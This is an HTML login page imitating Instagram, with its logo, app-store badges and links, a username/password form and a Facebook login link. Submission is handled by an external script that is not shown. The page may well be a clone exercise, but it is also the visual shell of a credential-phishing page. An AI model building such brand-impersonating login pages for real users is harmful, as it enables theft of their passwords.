<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" href="./login.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
</head>
<body>
    <div class="container">
        <div class="center">
            <div class="logo">
                 <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram" class="logoo">
            </div>
            <form id="loginForm">
                <div class="inputs" >
                    <input type="text" placeholder="Phone number or E-mail" class="inputText" id="username" autocomplete="username"><br>
                    <input type="password" name="pwd" class="inputText" id="password" autocomplete="current-password"><br>

                    <input type="submit" value="Log in" class="inputbutton" >
            </form>
            
                    <div class="line">
                        <span class="arrow"></span>
                        <span class="content">OR</span>
                        <span class="arrow"></span>
                    </div>
                    <div class="icons">
                        <i class="fa fa-facebook-square" style="color:	#0f3d79;"><span>
                            <a href="">Log in with Facebook</a>
                        </span></i>
                    </div>
                    <div class="forgotpw">Forgot password?</div>
                </div>
        </div>
        
        <div class="footer"><p>Don't have a account?<a href="#" class="texxt">Sign up</a></p></div>
        <div class="last">
            <p>Get the app</p>
            <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8">
                <img class="img"  src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png" >
            </a>
            <a href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge">
                <img class="img" src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png">
            </a>
        </div>
    
    
    </div>

    <script src="./login.js"></script>
</body>
</html>
